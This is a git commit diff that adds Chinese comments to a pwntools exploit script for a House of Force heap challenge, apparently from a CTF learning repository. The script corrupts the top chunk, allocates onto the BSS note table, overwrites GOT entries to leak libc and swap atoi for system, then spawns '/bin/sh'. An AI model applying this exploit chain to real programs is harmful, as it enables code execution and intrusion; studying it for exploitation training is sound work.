9c9ed614f6e0094db96a9d4596bb39fd0537f54a
De4dCr0w <sa516203@mail.ustc.edu.cn>
2018-05-31 10:51:32 +0800

    添加注释

--- House系列/House-of-force/exp.py
+++ House系列/House-of-force/exp.py
@@ -47,18 +47,18 @@ def pwn_top_chunk():
 
 	return heap
 if __name__=="__main__":
-	heap = pwn_top_chunk()
+	heap = pwn_top_chunk()#修改top_chunk的大小
 	
 	gdb.attach(p)	
 # Plan - step 1: Request a chunk to reach the BSS
 	pause()	
-	new_note(0x10,"test") #need chunk 2 to fill system_address
+	new_note(0x10,"test") #一共需要三个note，不分配的话，note长度为0，不能进行edit
 
 	top_chunk = heap -8 + 0x48*3 + 0x18
 	bss_address=  0x804B118 - 8
 	#size = 0x10804B118 - top_chunk
-	size = top_chunk - bss_address
-	new_note(-size,"test")
+	size = top_chunk - bss_address   #使其分配到bss上存放note的地址，后续可操作每个note
+	new_note(-size,"test")   #修改top_chunk的地址
 	
 	payload = p32(elf.got["free"])
 	payload += p32(elf.got["atoi"])
@@ -66,8 +66,8 @@ if __name__=="__main__":
 
 	new_note(0x100,payload)	
 
-	edit_note("0",p32(elf.plt['printf']))
-	delete_note("1")
+	edit_note("0",p32(elf.plt['printf'])) #第一个note用于将.plt.printf地址覆盖到.got.free上
+	delete_note("1") # 第二note用于执行printf .got.atoi存放的地址，做泄露用
 
 	atoi_address = u32(p.read(4))
 
@@ -78,7 +78,7 @@ if __name__=="__main__":
 	
 	print "system_address: " + hex(system_address)
 
-	edit_note("2",p32(system_address))
+	edit_note("2",p32(system_address)) #第三个note用于将atoi的地址覆盖成system的地址
 
 	p.sendline("/bin/sh\0")
 	
